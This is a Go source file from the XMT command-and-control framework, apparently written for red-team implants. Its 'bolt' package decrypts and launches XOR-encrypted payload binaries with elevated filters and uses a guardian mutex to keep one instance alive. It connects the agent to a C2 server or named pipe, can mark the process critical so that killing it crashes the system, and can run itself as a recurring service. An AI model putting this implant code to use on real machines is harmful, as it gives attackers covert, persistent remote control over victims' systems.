// Copyright (C) 2021 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package bolt

import (
	"context"
	"os"
	"syscall"
	"time"

	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/man"
	"github.com/iDigitalFlame/xmt/util"
)

// Launch will start the process of locating and triggering a Guardian.
//
// If a Guardian is not detected, this function will attempt to start a Bolt
// instance from the provided binary file DB list supplied.
func Launch(guard string, files []string, key []byte) {
	if len(files) == 0 {
		return
	}
	if man.Check(man.Event, guard) {
		return
	}
	var x crypto.XOR
	if len(key) > 0 {
		x = crypto.XOR(key)
	}
	for i, f := 0, filter.B(true).SetElevated(true); i < 5; i++ {
		s, err := man.Crypt(x, files[util.FastRandN(len(files))])
		if err != nil {
			continue
		}
		s.Filter = f
		if _, err = s.Check(man.Event, guard); err == nil {
			break
		}
	}
}

// Agent -
func Agent(guard, pipe string, ignore, load, crit bool, l man.Linker, c cfg.Config) {
	p, err := c.Build()
	if err != nil {
		return
	}
	var (
		x, f = context.WithCancel(context.Background())
		s    *c2.Session
	)
	if load {
		if s, err = c2.LoadContext(x, nil, pipe, time.Millisecond*500); err == nil {
			if len(guard) > 0 {
				go func() {
					time.Sleep(time.Second * time.Duration(2+uint64(util.FastRandN(3))))
					man.GuardContext(x, l, guard)
				}()
			}
		}
	}
	if s == nil {
		if len(guard) > 0 {
			if man.Check(l, guard) && !ignore {
				f()
				return
			}
			man.GuardContext(x, l, guard)
		}
		if s, err = c2.ConnectContext(x, nil, p); err != nil {
			f()
			return
		}
	}
	limits.Ignore()
	limits.MemorySweep(x)
	w := make(chan os.Signal, 1)
	if limits.Notify(w, syscall.SIGINT, syscall.SIGTERM); crit {
		device.SetCritical(true)
	}
	select {
	case <-w:
	case <-x.Done():
	case <-s.Done():
	}
	if s.Close(); crit {
		device.SetCritical(false)
	}
	limits.StopNotify(w)
	limits.Reset()
	close(w)
	f()
	device.GoExit()
}

// LaunchAsService -
func LaunchAsService(t time.Duration, name, guard string, files []string, key []byte) {
	device.DaemonTicker(name, t, func(_ context.Context) error {
		Launch(guard, files, key)
		return nil
	})
}
